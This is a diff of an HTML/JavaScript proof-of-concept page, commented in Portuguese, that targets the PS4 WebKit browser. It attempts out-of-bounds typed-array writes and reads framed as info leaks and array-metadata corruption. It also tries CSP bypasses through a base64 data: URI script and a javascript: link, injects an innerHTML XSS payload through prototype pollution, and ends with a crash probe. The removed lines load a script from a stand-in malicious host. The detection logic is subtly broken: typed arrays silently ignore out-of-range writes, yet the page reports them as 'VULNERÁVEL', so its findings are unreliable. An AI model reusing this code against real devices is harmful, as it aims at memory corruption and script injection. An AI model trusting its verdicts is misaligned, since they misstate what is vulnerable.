@@ -2,23 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Focado</title>
+    <title>PS4 WebKit PoC - Exploração Avançada</title>
     <style>
-        /* Estilos CSS (Log Vulnerável Atualizado) */
+        /* Estilos CSS (iguais ao script focado) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
         #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; }
         .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
         .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
-        .log-vuln { color: #ff4444; /* Vermelho mais vivo */ font-weight: bold; /* Sem fundo */ }
+        .log-vuln { color: #ff4444; font-weight: bold; }
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
         .log-error { color: #f44336; }
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Demonstração Focada</h1>
-    <p>Script refinado mostrando apenas vulnerabilidades confirmadas (OOB Write, CSP Bypass, Prototype Pollution). Teste CSP inclui link que requer clique manual.</p>
+    <h1>PS4 WebKit PoC - Tentativas de Exploração Avançada</h1>
+    <p>AVISO: Script complexo focado em Info Leak, Corrupção, Interação IPC (simulada), Chaining. Pode travar.</p>
     <div id="poc-output"></div>
 
     <script>
@@ -29,121 +29,306 @@
                 const timestamp = `[${new Date().toLocaleTimeString()}] `;
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${sanitizedMessage}\n</span>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight; // Reativar scroll sempre
+                outputDiv.scrollTop = outputDiv.scrollHeight;
             } else { console.error("Elemento #poc-output não encontrado!"); }
         };
 
-        const PAUSE_DURATION = 500; // Pausa
+        const PAUSE_DURATION = 500;
 
-        // --- Funções de Teste Mantidas ---
+        // --- Funções de Teste Atualizadas/Novas ---
 
-        // Teste 1: OOB Write (Uint8) Simplificado
-        const runOOBTestU8 = async () => {
-            log("--- Iniciando Teste 1: OOB Write (Uint8) ---", 'test');
+        // Teste 1: OOB Write + Tentativa de Info Leak Avançada (Múltiplos Tipos)
+        const runOOBLeakAdvanced = async () => {
+            log("--- Iniciando Teste 1: OOB Write + Advanced Info Leak ---", 'test');
             try {
-                const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
-                const writeValue = 0xEE;
-                const writeOffsets = [-1, bufferSize, bufferSize + 10]; // Offsets chave
-                for (const writeOffset of writeOffsets) {
-                    log(`Tentando escrita OOB U8 no offset ${writeOffset}...`, 'subtest');
-                    try {
-                        view[writeOffset] = writeValue;
-                        log(`VULNERÁVEL: Escrita OOB U8 no offset ${writeOffset} bem-sucedida!`, 'vuln');
-                    } catch (writeError) { log(`✅ Escrita OOB U8 bloqueada/erro: ${writeError.message}`, 'good'); }
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                }
-            } catch (e) { log(`Erro GERAL no teste OOB U8: ${e.message}`, 'warn'); }
+                const bufferSize = 64; // Aumentar um pouco para dar mais espaço
+                const buffer = new ArrayBuffer(bufferSize);
+                const u8view = new Uint8Array(buffer);
+                const u32view = new Uint32Array(buffer);
+                const f64view = new Float64Array(buffer);
+
+                const writeOffset = bufferSize; // Escrever logo após o buffer
+                const writeValue = 0xAA;
+
+                log(`Tentando escrita OOB U8 no offset ${writeOffset}...`, 'subtest');
+                try {
+                    u8view[writeOffset] = writeValue;
+                    log(`VULNERÁVEL: Escrita OOB U8 no offset ${writeOffset} bem-sucedida!`, 'vuln');
+
+                    // Tentar ler OOB com diferentes tipos
+                    const leakOffsetBytes = writeOffset; // Ler onde escrevemos (ou perto)
+                    const leakOffsetU32 = leakOffsetBytes / 4;
+                    const leakOffsetF64 = leakOffsetBytes / 8;
+                    const readLength = 4; // Ler alguns elementos/bytes
+
+                    log(`Tentando Info Leak OOB em offset ${leakOffsetBytes} (bytes)...`, 'subtest');
+                    for (let i = 0; i < readLength; i++) {
+                        let currentOffset = leakOffsetBytes + i;
+                        try {
+                            const val = u8view[currentOffset];
+                            log(`  Leak U8[${currentOffset}]: ${val !== undefined ? '0x'+val.toString(16) : 'undefined'}`, val !== undefined && val !== 0 ? 'warn' : 'info');
+                        } catch(e){ log(`  Leak U8[${currentOffset}]: ERRO ${e.message}`, 'error'); }
+                    }
+                     if (Number.isInteger(leakOffsetU32)) {
+                         log(`Tentando Info Leak OOB em offset ${leakOffsetU32} (Uint32)...`, 'subtest');
+                         for (let i = 0; i < readLength; i++) {
+                             let currentOffset = leakOffsetU32 + i;
+                             try {
+                                 const val = u32view[currentOffset];
+                                 log(`  Leak U32[${currentOffset}]: ${val !== undefined ? '0x'+val.toString(16) : 'undefined'}`, val !== undefined && val !== 0 ? 'warn' : 'info');
+                                 // Valores grandes aqui podem ser partes de ponteiros!
+                                 if (val !== undefined && val > 0xFFFF) { log(`    >> Potencial Ponteiro/Dado Grande!`, 'vuln');}
+                             } catch(e){ log(`  Leak U32[${currentOffset}]: ERRO ${e.message}`, 'error'); }
+                         }
+                     }
+                     if (Number.isInteger(leakOffsetF64)) {
+                         log(`Tentando Info Leak OOB em offset ${leakOffsetF64} (Float64)...`, 'subtest');
+                          for (let i = 0; i < readLength; i++) {
+                             let currentOffset = leakOffsetF64 + i;
+                             try {
+                                 const val = f64view[currentOffset];
+                                 log(`  Leak F64[${currentOffset}]: ${val}`, !isNaN(val) && val !== 0 ? 'warn' : 'info');
+                                 if (!isNaN(val) && val !== 0) { log(`    >> Potencial Float/Dado não-zero!`, 'vuln');}
+                             } catch(e){ log(`  Leak F64[${currentOffset}]: ERRO ${e.message}`, 'error'); }
+                         }
+                     }
+
+                } catch (writeError) { log(`✅ Escrita OOB U8 bloqueada/erro: ${writeError.message}`, 'good'); }
+
+            } catch (e) { log(`Erro GERAL no teste OOB Leak Adv: ${e.message}`, 'warn'); }
             log("--- Teste 1 Concluído ---", 'test');
         };
 
-        // Teste 2: OOB Write com Outros Tipos (Uint32)
-        const runOOBOtherTypes = async () => {
-            log("--- Iniciando Teste 2: OOB Write (Uint32) ---", 'test');
+        // Teste 2: OOB Write visando Corrupção de Metadados (ArrayBuffer / JSArray)
+        const runOOBCorruptMeta = async () => {
+             log("--- Iniciando Teste 2: OOB Write visando Corrupção de Metadados ---", 'test');
+             // Esta é uma área muito dependente da implementação interna do WebKit/JavaScriptCore
+             // Vamos tentar escrever OOB e ver se afeta length/type de um array JS próximo (simplificado)
              try {
-                const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize);
-                const view = new Uint32Array(buffer); const numElements = bufferSize / 4;
-                const writeValue = 0xDEADBEEF;
-                const writeOffsets = [-1, numElements, numElements + 2]; // Offsets de elemento
+                 let targetArray = [1.1, 2.2]; // Array de floats próximo na memória?
+                 let attackBuffer = new ArrayBuffer(32);
+                 let attackView = new Uint8Array(attackBuffer);
+                 let originalLength = targetArray.length;
 
-                 for (const writeOffset of writeOffsets) {
-                    log(`Tentando escrita OOB U32 no offset de elemento ${writeOffset}...`, 'subtest');
-                    try {
-                        view[writeOffset] = writeValue;
-                        log(`VULNERÁVEL: Escrita OOB U32 no offset ${writeOffset} bem-sucedida!`, 'vuln');
-                    } catch (writeError) { log(`✅ Escrita OOB U32 bloqueada/erro: ${writeError.message}`, 'good'); }
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                }
-            } catch (e) { log(`Erro GERAL no teste OOB U32: ${e.message}`, 'warn'); }
-            log("--- Teste 2 Concluído ---", 'test');
-        };
+                 // Valores para tentar corromper (ex: size fields, type tags)
+                 // Pequenos inteiros, 0xFF..., etc.
+                 const corruptValues = [0, 1, 0xFF, 0xFFFFFFFF];
+                 const oobOffset = 32; // Escrever logo após o buffer
 
-        // Teste 3: OOB Write com Valores Diferentes
-        const runOOBWriteValues = async () => {
-            log("--- Iniciando Teste 3: OOB Write com Valores Diferentes ---", 'test');
-            try {
-                const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
-                const writeOffset = bufferSize; // Offset OOB
-                const valuesToWrite = [0, 0xFF, 128, -1]; // Valores chave
+                 log(`Array alvo inicial: [${targetArray.join(',')}] (length=${originalLength})`, 'info');
 
-                for(const value of valuesToWrite) {
-                     log(`Tentando escrita OOB U8 no offset ${writeOffset} com valor ${value}...`, 'subtest');
+                 for (const value of corruptValues) {
+                     log(`Tentando escrita OOB em offset ${oobOffset} com valor ${value} (visando metadados do array)...`, 'subtest');
                      try {
-                        view[writeOffset] = value;
-                        log(`VULNERÁVEL: Escrita OOB U8 no offset ${writeOffset} com valor ${value} bem-sucedida!`, 'vuln');
-                     } catch (writeError) { log(`✅ Escrita OOB U8 bloqueada/erro: ${writeError.message}`, 'good'); }
+                         attackView[oobOffset] = value; // Tentar sobrescrever algo adjacente
+                         log("Escrita OOB realizada.", 'info');
+
+                         // Verificar se o array alvo foi afetado
+                         if (targetArray.length !== originalLength) {
+                             log(`VULNERÁVEL: Comprimento do Array alterado! Original=${originalLength}, Atual=${targetArray.length}`, 'vuln');
+                             // Se o comprimento mudou, podemos ter leitura OOB no *array* agora?
+                             try {
+                                 log(`  Tentando ler OOB do Array: targetArray[${originalLength}] = ${targetArray[originalLength]}`, 'warn');
+                             } catch(readError) { log(`  Erro lendo OOB do Array: ${readError.message}`, 'warn'); }
+                         } else {
+                              log(`Comprimento do Array permaneceu ${targetArray.length}.`, 'info');
+                         }
+                         // Poderíamos tentar acessar o array de formas estranhas aqui para ver se o tipo foi corrompido
+                         // Ex: targetArray.slice(), typeof targetArray[0] etc.
+
+                     } catch (writeError) {
+                         log(`✅ Escrita OOB bloqueada/erro: ${writeError.message}`, 'good');
+                         break; // Se uma escrita falha, as outras provavelmente também
+                     }
                      await new Promise(resolve => setTimeout(resolve, 50));
-                }
-            } catch (e) { log(`Erro GERAL no teste OOB Write Values: ${e.message}`, 'warn'); }
-            log("--- Teste 3 Concluído ---", 'test');
+                 }
+
+             } catch (e) { log(`Erro GERAL no teste OOB Corrupt Meta: ${e.message}`, 'warn'); }
+             log("--- Teste 2 Concluído ---", 'test');
         };
 
-        // Teste 4: CSP Bypass (Inclui teste de link javascript:)
-        const runCSPTest = () => {
-            log("--- Iniciando Teste 4: CSP Bypass ---", 'test');
-            // 4.1: data: URI
-            log("Tentando carregar script via data: URI...", 'info');
-            try { const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIGRlIENTUCB2aWEgZGF0YTogVVJJIGJlbS1zdWNlZGlkbyEiLCAndnVsbicpOw=='; document.body.appendChild(s); } catch (e) { log(`Erro data:: ${e.message}`, 'warn'); }
-
-            // 4.2: inline handler
-            log("Tentando executar script via inline handler (onerror)...", 'info');
-            try { const i=document.createElement('img'); i.src='x'; i.onerror=()=>{log("VULNERÁVEL: Bypass de CSP via inline handler 'onerror' bem-sucedido!", 'vuln');}; document.body.appendChild(i); } catch (e) { log(`Erro onerror: ${e.message}`, 'warn'); }
-
-            // 4.3: fonte externa (bloqueio esperado)
-            log("Tentando carregar script de fonte externa (deve ser bloqueado)...", 'info');
-            try { const es=document.createElement('script'); es.src='https://malicious.example.com/blocked.js'; es.onload=()=>{log("ERRO CSP: NÃO bloqueou externo!", 'vuln');}; es.onerror=()=>{log("✅ Bloqueio CSP externo funcionou.", 'good');}; document.body.appendChild(es); } catch (e) { log(`Erro script ext: ${e.message}`, 'warn'); }
-
-            // 4.4: javascript: URI em link (requer clique)
-            log("Tentando injetar link com javascript: URI (requer clique)...", 'info');
+        // Teste 3: CSP Bypass + Payload Avançado (simulando chamada de OOB)
+        const runCSPAdvancedPayload = () => {
+            log("--- Iniciando Teste 3: CSP Bypass + Payload Avançado ---", 'test');
+            log("Tentando carregar payload OOB via data: URI...", 'info');
+            try {
+                // Payload JS que tenta executar uma escrita OOB simples e logar
+                const payloadJS = `
+                    log("[Payload Injetado] Iniciando...", "info");
+                    try {
+                        let buf = new ArrayBuffer(16);
+                        let view = new Uint8Array(buf);
+                        view[-1] = 0xCC; // Tenta OOB write
+                        log("[Payload Injetado] VULNERÁVEL: Escrita OOB dentro do payload funcionou!", "vuln");
+                    } catch(e) {
+                        log("[Payload Injetado] Erro na escrita OOB: " + e.message, "good");
+                    }
+                    log("[Payload Injetado] Concluído.", "info");
+                `;
+                const encodedPayload = btoa(payloadJS); // Codificar em Base64
+                const scriptTag = document.createElement('script');
+                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
+                scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: com payload!", 'error');};
+                document.body.appendChild(scriptTag);
+                 log("Tag script com payload OOB adicionada.", 'info');
+            } catch (e) { log(`Erro ao criar payload data:: ${e.message}`, 'warn'); }
+             // Manter o teste do link javascript: que funcionou
+             log("Tentando injetar link com javascript: URI (requer clique)...", 'info');
              try {
                 const jsLink = document.createElement('a');
                 jsLink.href = "javascript:log('VULNERÁVEL: Bypass de CSP via javascript: URI em link clicado!', 'vuln'); try{alert('Bypass via javascript: URI!');}catch(e){log('Alerta bloqueado no javascript: URI', 'warn');}";
                 jsLink.textContent = "[Clique AQUI para Testar javascript: URI Bypass]";
-                jsLink.style.display = 'block'; jsLink.style.margin = '10px'; jsLink.style.padding = '5px';
-                jsLink.style.border = '1px solid orange'; jsLink.style.color = 'orange';
-                outputDiv.appendChild(jsLink); // Adicionar perto dos logs
-                log("Link com javascript: URI adicionado. Teste requer clique manual.", 'warn');
+                jsLink.style.display='block'; jsLink.style.margin='10px'; jsLink.style.padding='5px'; jsLink.style.border='1px solid orange'; jsLink.style.color='orange';
+                outputDiv.appendChild(jsLink);
+                log("Link com javascript: URI adicionado.", 'warn');
             } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
-
-            log("--- Teste 4 Concluído (Verifique logs e clique no link) ---", 'test');
+            log("--- Teste 3 Concluído ---", 'test');
         };
 
-        // Teste 5: Prototype Pollution
-        const runPrototypePollutionTest = () => {
-             log("--- Iniciando Teste 5: Prototype Pollution ---", 'test');
-            const k='poc_inj', v='Polluted!'; try { log(`Tentando poluir Object.prototype['${k}']...`, 'info'); Object.prototype[k]=v; const t={'w':window,'d':document,'n':{}}; let c=0; for(const n in t){ try { if(t[n] && t[n][k]===v){log(`VULNERÁVEL: PP detectada! ${n}.${k}=${t[n][k]}`, 'vuln'); c++;}} catch(e){} } if(c>0){log(`Confirmado: ${c} objeto(s) poluído(s).`, 'vuln');} else {log(`Aviso: Não confirmou poluição.`, 'warn');} try{delete Object.prototype[k];log("Limpou poluição.",'info');}catch(e){log(`Erro limpar PP: ${e.message}`,'warn');} } catch(e){log(`Erro GERAL PP: ${e.message}`,'warn');}
-             log("--- Teste 5 Concluído ---", 'test');
+        // Teste 4: Prototype Pollution + Tentativa de Impacto DOM
+        const runPPImpact = () => {
+            log("--- Iniciando Teste 4: Prototype Pollution + Tentativa de Impacto DOM ---", 'test');
+            const pollutionKey = 'innerHTML'; // Tentar poluir uma propriedade perigosa
+            const pollutionValue = '<img src=x onerror=alert(\'PP+DOM_XSS\')>'; // Valor XSS
+            let pollutionDone = false;
+
+            try {
+                log(`Tentando poluir Object.prototype['${pollutionKey}'] com XSS...`, 'info');
+                Object.prototype[pollutionKey] = pollutionValue;
+                pollutionDone = true; // Assume sucesso inicial
+
+                // Verificar se afetou um objeto normal
+                if (({})[pollutionKey] === pollutionValue) {
+                     log("VULNERÁVEL: Prototype Pollution de 'innerHTML' bem-sucedida!", 'vuln');
+
+                     // Agora, criar um elemento e ver se a poluição afeta sua atribuição innerHTML?
+                     // Isso depende de como o navegador implementa a atribuição.
+                     log("Tentando criar div e atribuir via innerHTML (pode usar valor poluído?)...", 'subtest');
+                     try {
+                         let div = document.createElement('div');
+                         // A atribuição direta pode não usar o prototype poluído.
+                         // Precisamos de um cenário onde o 'innerHTML' seja lido do prototype.
+                         // Ex: Uma biblioteca ou código que faça algo como: if (!element.innerHTML) element.innerHTML = Object.prototype.innerHTML; (improvável)
+                         // Vamos simular um acesso que poderia ser vulnerável:
+                         let tempObj = {};
+                         if (tempObj.innerHTML) { // Lê do prototype poluído
+                             log("Lendo 'innerHTML' do prototype em objeto temporário...", 'info');
+                             let potentiallyHarmful = tempObj.innerHTML;
+                             log(`Valor lido: ${potentiallyHarmful}`, 'warn');
+                             // Tentar atribuir isso a um elemento real (PERIGOSO!)
+                             // let targetDiv = document.createElement('div');
+                             // targetDiv.innerHTML = potentiallyHarmful; // Isso executaria o XSS se funcionasse
+                             // document.body.appendChild(targetDiv);
+                             log("SIMULAÇÃO: Atribuir este valor via innerHTML poderia causar XSS.", 'vuln');
+                         } else {
+                             log("Atribuição via innerHTML não parece usar prototype diretamente neste teste.", 'info');
+                         }
+                     } catch (domError) {
+                         log(`Erro ao testar impacto DOM da PP: ${domError.message}`, 'warn');
+                     }
+                } else {
+                     log("Falha inicial ao poluir Object.prototype.innerHTML.", 'warn');
+                     pollutionDone = false;
+                }
+            } catch (e) {
+                log(`Erro GERAL no teste PP Impact: ${e.message}`, 'warn');
+                pollutionDone = false;
+            } finally {
+                 // Limpeza CRUCIAL
+                 if (pollutionDone) {
+                    try { delete Object.prototype[pollutionKey]; log("Limpou poluição innerHTML.",'info');}
+                    catch (cleanError){ log(`Erro limpar PP innerHTML: ${cleanError.message}`,'warn');}
+                 }
+            }
+            log("--- Teste 4 Concluído ---", 'test');
+        };
+
+        // Teste 5: Estressar APIs Pós-OOB (Tentativa de Interação IPC/Kernel)
+        const runStressAPIsPostOOB = async () => {
+            log("--- Iniciando Teste 5: Estressar APIs Pós-OOB (IPC/Kernel Probe) ---", 'test');
+            log("AVISO: Teste altamente especulativo.", 'warn');
+
+            let oobSuccess = false;
+            // 1. Realizar uma escrita OOB primeiro
+            try {
+                const buffer = new ArrayBuffer(32); const view = new Uint8Array(buffer);
+                view[32] = 0xBB; // Escrita OOB simples
+                log("Escrita OOB pré-estresse realizada.", 'info');
+                oobSuccess = true;
+            } catch (e) { log(`Falha na escrita OOB pré-estresse: ${e.message}`, 'warn'); }
+
+            if (oobSuccess) {
+                // 2. Chamar APIs que podem interagir mais com o sistema
+                log("Estressando Canvas API...", 'subtest');
+                try {
+                    let canvas = document.createElement('canvas');
+                    canvas.width = 2048; canvas.height = 2048; // Tamanho grande
+                    let ctx = canvas.getContext('2d');
+                    ctx.fillStyle = 'red';
+                    for (let i=0; i<100; i++) { // Operações repetitivas
+                        ctx.fillRect(0, 0, Math.random()*2048, Math.random()*2048);
+                    }
+                    ctx.getImageData(0, 0, 1, 1); // Operação de leitura
+                    log("Canvas estressado sem erro aparente.", 'info');
+                } catch (e) { log(`Erro durante estresse do Canvas: ${e.message}`, 'warn'); } // Um erro aqui PODE ser interessante
+
+                 // Adicionar teste com IndexedDB se disponível
+                 log("Estressando IndexedDB API (se disponível)...", 'subtest');
+                 if(window.indexedDB) {
+                     try {
+                         const dbName = "StressDB";
+                         const request = window.indexedDB.open(dbName, 1);
+                         request.onupgradeneeded = (event) => {
+                             const db = event.target.result;
+                             if (!db.objectStoreNames.contains("StressStore")) {
+                                 db.createObjectStore("StressStore", { keyPath: "id", autoIncrement:true });
+                             }
+                         };
+                         request.onsuccess = async (event) => {
+                            const db = event.target.result;
+                            const transaction = db.transaction(["StressStore"], "readwrite");
+                            const store = transaction.objectStore("StressStore");
+                            log("Tentando adicionar 1000 itens no IndexedDB...", 'info');
+                            for(let i=0; i<1000; i++) {
+                                store.add({ data: "item_" + i + "_payload_".repeat(50) }); // Adicionar dados
+                            }
+                            await new Promise(res => transaction.oncomplete = res); // Esperar completar
+                            log("IndexedDB estressado sem erro aparente.", 'info');
+                            db.close();
+                            window.indexedDB.deleteDatabase(dbName); // Limpeza
+                         };
+                         request.onerror = (event) => { log(`Erro no IndexedDB stress: ${event.target.error}`, 'warn'); };
+                     } catch (e) { log(`Erro GERAL no estresse IndexedDB: ${e.message}`, 'warn');}
+                 } else { log("IndexedDB não disponível.", 'info'); }
+
+                 // Adicionar mais APIs se relevante (WebRTC, etc.)
+
+            } else {
+                log("Pulando estresse de APIs pois escrita OOB falhou.", 'warn');
+            }
+            log("--- Teste 5 Concluído ---", 'test');
+        };
+
+        // Teste 6: OOB Crash Probe (Mantido no final)
+        const runOOBCrashProbe = async () => {
+             log("--- Iniciando Teste 6: OOB Crash Probe ---", 'test');
+             log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 3000));
+             try { const b=new ArrayBuffer(32),v=new Uint8Array(b); const o=-20000,w=0xDEADBEEF; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=w; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn'); }
+             catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); }
+             log("--- Teste 6 Concluído (se não travou) ---", 'test');
         };
 
 
         // --- Função Principal de Execução ---
         const runAllTests = async () => {
-            log("Iniciando testes de PoC (VERSÃO FOCADA)...");
+            log("Iniciando todos os testes de PoC (EXPLORAÇÃO AVANÇADA)...");
             const tests = [
-                runOOBTestU8,             // Teste 1 - OOB U8
-                runOOBOtherTypes,         // Teste 2 - OOB U32
-                runOOBWriteValues,        // Teste 3 - OOB Valores
-                runCSPTest,               // Teste 4 - CSP Bypass
-                runPrototypePollutionTest // Teste 5 - Prototype Pollution
+                runOOBLeakAdvanced,       // Teste 1 - Foco Info Leak
+                runOOBCorruptMeta,        // Teste 2 - Foco Corrupção Meta
+                runCSPAdvancedPayload,    // Teste 3 - CSP com Payload OOB + Link JS
+                runPPImpact,              // Teste 4 - PP + Tentativa DOM Impact
+                runStressAPIsPostOOB,     // Teste 5 - Estressar APIs Pós-OOB
+                runOOBCrashProbe          // Teste 6 - Crash Probe (Último)
             ];
 
             for(let i=0; i < tests.length; i++){
@@ -163,7 +348,7 @@
                  }
             }
 
-            log("\n\nTodos os testes PoC FOCADOS foram concluídos. Revise o log acima.", 'test');
+            log("\n\nTodos os testes PoC AVANÇADOS foram concluídos (se não travou). Revise o log acima.", 'test');
         };
 
         // Executar ao carregar a página
